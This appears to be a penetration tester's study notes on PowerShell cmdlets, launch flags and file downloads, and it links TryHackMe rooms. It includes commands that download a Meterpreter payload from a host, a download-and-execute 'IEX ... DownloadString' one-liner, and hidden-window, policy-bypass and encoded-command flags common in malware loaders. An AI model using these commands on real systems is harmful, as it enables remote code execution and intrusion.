# Powershell

In short, "PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. PowerShell runs on Windows, Linux, and macOS." There is a comprehensive document [here](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2), on Microsoft website.

There is also a brief [Introduction to powershell](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) course.

Microsoft has a free course on Introduction to Powershell [here](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) on their website. Information on [about\_Powershell.exe](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_powershell\_exe?view=powershell-5.1\&viewFallbackFrom=powershell-7.2).

We can run powershell from the Start Menu by searching for it, through the command prompt by running `powershell.exe`, or through the run dialogbox(`windows key+r`) and running `powershell.exe`

## Commands

* `IEX` OR `Invoke Expression`
  * The `Invoke-Expression` cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without `Invoke-Expression`, a string submitted at the command line is returned (echoed) unchanged.

## Arguments

* `-NoP` OR `-NoProfile`
  * When you launch PowerShell with NoProfile parameter, it ensures to run script in default PowerShell environment and run without any Windows PowerShell profile. Does not load the Windows PowerShell profile.
  * powershell.exe -NoP
* `-NonI` OR `-NonInteractive`
  * Does not present an interactive prompt to the user.
* `-W Hidden` OR `-WindowStyle Hidden`
  * Sets the window style to Normal, Minimized, Maximized or Hidden.
* `-Exec Bypass` OR `-ExecutionPolicy Bypass`
  * Sets the default execution policy for the current session and saves it in the `$env:PSExecutionPolicyPreference` environment variable. This parameter does not change the Windows PowerShell execution policy that is set in the registry.
* `-Enc` OR `-EncodedCommand`
  * Accepts a base-64-encoded string version of a command. Use this parameter to submit commands to Windows PowerShell that require complex quotation marks or curly braces.

## Cmdlet

A cmdlet is a lightweight command that is used in the PowerShell environment. The PowerShell runtime invokes these cmdlets within the context of automation scripts that are provided at the command line. Cmdlets perform an action and typically return a Microsoft .NET object to the next command in the pipeline. A cmdlet is a single command that participates in the pipeline semantics of PowerShell. This includes binary (C#) cmdlets, advanced script functions, CDXML, and Workflows.

A cmdlet is simply a command through which you can perform an action. The two most helpful cmdlets that everyone should be aware of are:

* Get-Command
* Get-Help

Using the cmdlet ‘Get-Command’, you can find all the available cmdlets even if you do not know the exact cmdlet. For example, you want to restart a service from PowerShell, but you do not know the cmdlet. Although you can assume that it may contain the word ‘service’.

Common verbs:

* Get
* Start
* Stop&#x20;
* Read
* Write
* New
* Out

Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7).

## Commands

* `Get-Help` shows information about a cmdlet_._ `Get-Help Command-Name`
* `Get-Command` - Gets all the cmdlets installed on the current Computer. This cmdlet allows for pattern matching such as `Get-Command Verb-*` or `Get-Command *-Noun`
* `The Pipe( | )` - Used to pass output from one cmdlet to another. Eg. `Verb-Noun | Get-Member`&#x20;
* `Invoke-Webrequest` - Makes a request to a webserver. Sends HTTP and HTTPS requests to a web page or web service. It parses the response and returns collections of links, images, and other significant HTML elements. More info can be found [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2).
  * Download a file: `Invoke-WebRequest -URI http://(IP):(PORT)/(FILE) -Outfile (FILE)`
  * `Invoke-WebRequest "URL/File" -OutFile "File"`
    * `Invoke-WebRequest "http://10.0.2.8/meterpreter-64.ps1" -Outfile "meterpreter.ps1"`
* `Invoke-Expression` - Evaluates or runs a specified string as a command and returns the results of the expression or command. Without `Invoke-Expression`, a string submitted at the command line is returned (echoed) unchanged.
* `(New-Object System.Net.WebClient)DownloadFile('URL/File', 'Output-File')`
  * `(New-Object System.Net.WebClient)DownloadFile('http://10.0.2.8/meterpreter-64.ps1', 'meterpreter.ps1')`
* `Get-Hotfix` - Enumerate already installed patches
  * `Get-Hotfix | Format-list | findstr InstalledOn`
  * `Get-Hotfix | Format-Table HotFixID`
* `Format-List` - Used to gather more information about objects
  * `dir | Format-List`
* `Out-File` - Used to save the output to a file for further use
  * `Get-Hotfix | Out-File Hotfixes.txt`
* `Start-Process` - Used to start a process, such as notepad.
* `Get-Process` - Lists all running processes. Can also be used with the `-name` parameter to filter for a specific process
* `(command) | Export-Csv` - Exports the Previously piped command into a .CSV file that may be easier to read.
* `Get-Content` - Shows the contents of a file. Similar to the `cat` command on linux.
* `Copy-Item` - Copies and item
* `Move-Item` - Moves and item
* `Get-FileHash` - Obtains file hash of specified file

## Arguments

* `-NoP` OR `-NoProfile`
  * When you launch PowerShell with NoProfile parameter, it ensures to run script in default PowerShell environment and run without any Windows PowerShell profile. Does not load the Windows PowerShell profile.
  * powershell.exe -NoP
* `-NonI` OR `-NonInteractive`
  * Does not present an interactive prompt to the user.
* `-W Hidden` OR `-WindowStyle Hidden`
  * Sets the window style to Normal, Minimized, Maximized or Hidden.
* `-Exec Bypass` OR `-ExecutionPolicy Bypass`
  * Sets the default execution policy for the current session and saves it in the `$env:PSExecutionPolicyPreference` environment variable. This parameter does not change the Windows PowerShell execution policy that is set in the registry.
* `-Enc` OR `-EncodedCommand`
  * Accepts a base-64-encoded string version of a command. Use this parameter to submit commands to Windows PowerShell that require complex quotation marks or curly braces.

## Download files

*   Invoke-WebRequest http://`(IP)`:(PORT)/(FILE) -Outfile (Outputfile)

    * Invoke-WebRequest -URI http://192.168.1.52:8000/test.txt -Outfile Downloaded.txt



![](<../../.gitbook/assets/image (20).png>)

* "IEX (New-Object Net.WebClient).DownloadString('URL')"
  * IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')

## Additional resources

[TryHackMe Hacking With Powershell](https://tryhackme.com/room/powershell)

[TryHackme Powershell for Pentesters](https://tryhackme.com/room/powershellforpentesters)
